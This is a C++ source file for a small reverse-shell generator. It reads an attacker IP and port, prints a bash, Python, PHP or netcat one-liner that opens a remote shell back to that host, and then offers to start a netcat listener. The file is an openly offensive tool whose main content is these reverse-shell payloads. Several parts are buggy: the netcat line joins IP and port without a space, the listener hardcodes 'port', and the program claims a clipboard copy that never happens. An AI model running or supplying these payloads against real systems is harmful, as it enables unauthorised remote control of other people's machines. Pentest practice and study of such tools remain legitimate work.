/*
 *      Usage:-
 *
 *      ./a.out [IP] [PORT] 
 *
 *      ==============================
 *                  To Do
 *      ==============================
 *      [ ] TUI, live shell view of all shells (nnn -inspired)
 *      [ ] take inputs in main
 *      [ ] catch Ip from tun0 (option)
 *      [ ] Error Handling
 *
 */

#include<iostream>

void figlet_out();
void listener();
void shell_menu();

int main() {
    figlet_out();
    char ip[15] ;
    int port ;
    /*
     * switch statement for ip or interface selection
     * 3 ways to input ip and port
     *    1  from CLI in when invoking main
     *    2  from the 'std::cin
     *    3  from computer interface
     * OR Leave blank for tun0
     */
    std::cout << "Enter IP4 address of Listener machine : "<< "\n";
    std::cin >> ip ;
    std::cout << "Enter PORT: "<< "\n";
    std::cin >> port ;

    // Shell selector
    shell_menu();
    int shell_number = 0;
    std::cin >> shell_number;
    std::cout << "#######################"<< "\n";
    std::cout << "~~~~~~~~~~~~~~~~~~~~~~~"<< "\n";

    switch (shell_number)
    {
        case 1: //bash
            std::cout<<"bash -c 'exec bash -i &>/dev/tcp/"<<ip<<"/"<<port
                <<" <&1'"<< std::endl;
            break;
        case 2: //python
            std::cout<<"python -c 'import socket,subprocess,os;s=socket.socket"
                <<"(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""
                << ip << "\"," << port << "));os.dup2(s.fileno(),0);os.dup2"
                <<"(s.fileno(),1);os.dup2(s.fileno(),2);"
                <<"import pty;pty.spawn(\"/bin/bash\")'"<< std::endl;
            break;
        case 3: //PHP
            std::cout<<"php -r '$sock=fsockopen(getenv(\"" << ip << "\"),"
                << "getenv(\""<< port << "\"));exec(\"/bin/sh -i"
                << "<&3 >&3 2>&3\");'"<< std::endl;
            break;
        case 4: //Netcat
            std::cout<<"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "
                << ip << port<<" >/tmp/f"<< std::endl;
            break;
        default:
            std::cout<<"Reverse Shell for "<<shell_number<<" is not available."
                << std::endl;
            break;
    }
    std::cout << "~~~~~~~~~~~~~~~~~~~~~~~"<< "\n";
    std::cout << "Selected Reverse Shell copied to clipboard... \n\n";

    // clipboard feature not working
    // system(" standardout | xclip -selection clipboard");
    // Using Unix-style pipes in C++20

    listener();
    return 0;
}

void figlet_out() {
    std::cout<<"░▀█▀░█▀▀░█▀▄░█▄█░▀█▀░█▀█░█▀█░█░░"<<"\n"
             <<"░░█░░█▀▀░█▀▄░█░█░░█░░█░█░█▀█░█░░"<<"\n"
             <<"░░▀░░▀▀▀░▀░▀░▀░▀░▀▀▀░▀░▀░▀░▀░▀▀▀"<<"\n"
             <<"░█▀▄░█▀▀░█░█░█▀▀░█░█░█▀▀░█░░░█░░"<<"\n"
             <<"░█▀▄░█▀▀░▀▄▀░▀▀█░█▀█░█▀▀░█░░░█░░"<<"\n"
             <<"░▀░▀░▀▀▀░░▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀▀▀"<<"\n";
}

void shell_menu() {
    std::cout << "#######################"<< "\n";
    std::cout << "Enter Rev. Shell Number" << "\n"
        << "Enter 1 for Bash" << "\n"
        << "Enter 2 for Python" << "\n"
        << "Enter 3 for PHP" << "\n"
        << "Enter 4 for Netcat" << "\n";
}

void listener() {
    std::cout<<"Start Netcat listener on the above port? y/n : "; 
    char s='n';
    std::cin >> s;

    if(s=='n') {
        std::cout<<"Exiting the program"<<"\n";
    }
    else {
        std::cout<< "Starting a netcat listener"<< std::endl;
        system("nc -lvnp port"); // change port with previous user input
    }
}
